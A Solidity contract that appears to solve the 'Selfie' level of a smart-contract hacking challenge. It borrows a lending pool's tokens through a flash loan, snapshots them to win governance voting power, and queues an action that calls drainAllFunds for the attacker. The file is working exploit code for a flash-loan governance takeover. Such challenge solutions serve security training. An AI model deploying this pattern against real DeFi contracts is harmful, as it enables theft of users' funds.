pragma solidity ^0.8.0;

//@dev SimpleGovernance interface
interface ISimpleGovernance {
	function queueAction(
		address receiver,
		bytes calldata data,
		uint256 weiAmount
	) external returns (uint256);
}

//@dev FlashLoanPool interface
interface LendPool {
	function flashLoan(uint256 borrowAmount) external;
}

//@Snapshot of DVT interface
interface TokenSnapshot {
	function snapshot() external;

	function transfer(address, uint256) external;

	function balanceOf(address account) external returns (uint256);
}

/*@dev Flashloan pool does not check the tranfer so we can become the majority.
  It also does not check the action we perform. We can borrow the pool, take a
  snapshot to verify our balance and perform the action to drain it.
*/

contract SelfieAttacker {
	TokenSnapshot token;
	ISimpleGovernance governance;
	LendPool pool;
	address attacker;
	uint256 public actionId;

	constructor(
		TokenSnapshot _token,
		ISimpleGovernance _governance,
		LendPool _pool
	) public {
		token = _token;
		governance = _governance;
		pool = _pool;
	}

	//@dev execute step 1, take the loan
	function attack() public {
		uint256 flashLoanBalance = token.balanceOf(address(pool));
		attacker = msg.sender;
		pool.flashLoan(flashLoanBalance);
	}

	//@dev execute step 2, verify the balance via snapshot
	// and step 3, queue the action
	function receiveTokens(
	        address,	
		uint256 amount
	) external {
		token.snapshot();
		bytes memory drainAllFundsPayload =
			abi.encodeWithSignature("drainAllFunds(address)", attacker);
		actionId = governance.queueAction(
			address(pool),
			drainAllFundsPayload,
			0
		);

		token.transfer(address(pool), amount);
	}
}
